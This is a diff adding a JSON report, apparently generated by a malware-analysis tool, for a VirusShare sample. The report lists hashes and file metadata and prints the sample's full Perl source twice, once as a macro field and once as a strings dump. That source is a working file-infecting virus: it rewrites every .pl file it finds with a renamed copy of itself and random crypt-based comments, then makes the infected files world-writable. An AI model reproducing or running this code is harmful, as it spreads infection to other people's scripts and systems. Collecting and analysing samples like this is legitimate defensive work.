@@ -1,0 +1,71 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "open": "May open a file"
+        },
+        "macro": "#!/usr/bin/perl -w #!Sran\n\nqwerty();#\n\nsub qwerty {\n\na: while (<*.pl>)\n    {\n        my $oF = \"qwerty\";\n        my $tN = \"$ENV{\\\"HOME\\\"}/tmp/\".crypt($_, $_), $oN = \"./$_\", $nF = crypt($_, $oF);   \n            \n        open (WE, \"<$0\");                                       \n        open (IFILE, \"<$_\");\n        open (TEMP, \">$tN\");                                    \n        \n            while (<IFILE>) \n            {\n                chomp;\n                if (/\\#!Sran/) { unlink ($tN); next a }         \n                elsif (!/#!\\//) { print TEMP \"$_\\n\" }\n                else { print TEMP \"$_ #!Sran\\n$nF();\\n\" }               \n            }\n            \n            while (<WE>)\n            {\n                $st = \"\";\n                \n                s/#[0-9].*/$st/;\n                if (/sub $oF/ || /my \\$oF =/) { $cW = 1; s/$oF/$nF/}\n                next if (/#!\\/usr\\/bin\\/perl/ || /qwerty();#/ || !$cW);\n                if (int(rand(2))) { $st=\" #\".crypt($_, rand(256)) }\n                else {$st = \"\"}\n                \n                chomp;\n                print TEMP \"$_$st\\n\";\n            }\n        \n        unlink ($oN);\n        rename ($tN, $oN);\n        chmod (0777, $oN);\n    }\n}"
+    },
+    "filename": "VirusShare_3a08bb9bb6ea683946216b4c082a5022",
+    "filesize": 1246,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "3a08bb9bb6ea683946216b4c082a5022",
+        "sha1": "1dd4500562043ee05944baf0a711fd47382d47b8",
+        "sha256": "def1a29317eca3bc0558272e126e30392e85806bed1008eff1f9ea2d7d836aa8"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl -w #!Sran",
+            "qwerty();#",
+            "sub qwerty {",
+            "a: while (<*.pl>)",
+            "    {",
+            "        my $oF = \"qwerty\";",
+            "        my $tN = \"$ENV{\\\"HOME\\\"}/tmp/\".crypt($_, $_), $oN = \"./$_\", $nF = crypt($_, $oF);   ",
+            "            ",
+            "        open (WE, \"<$0\");                                       ",
+            "        open (IFILE, \"<$_\");",
+            "        open (TEMP, \">$tN\");                                    ",
+            "        ",
+            "            while (<IFILE>) ",
+            "            {",
+            "                chomp;",
+            "                if (/\\#!Sran/) { unlink ($tN); next a }         ",
+            "                elsif (!/#!\\//) { print TEMP \"$_\\n\" }",
+            "                else { print TEMP \"$_ #!Sran\\n$nF();\\n\" }               ",
+            "            }",
+            "            ",
+            "            while (<WE>)",
+            "            {",
+            "                $st = \"\";",
+            "                ",
+            "                s/#[0-9].*/$st/;",
+            "                if (/sub $oF/ || /my \\$oF =/) { $cW = 1; s/$oF/$nF/}",
+            "                next if (/#!\\/usr\\/bin\\/perl/ || /qwerty();#/ || !$cW);",
+            "                if (int(rand(2))) { $st=\" #\".crypt($_, rand(256)) }",
+            "                else {$st = \"\"}",
+            "                ",
+            "                chomp;",
+            "                print TEMP \"$_$st\\n\";",
+            "            }",
+            "        ",
+            "        unlink ($oN);",
+            "        rename ($tN, $oN);",
+            "        chmod (0777, $oN);",
+            "    }"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.265385",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
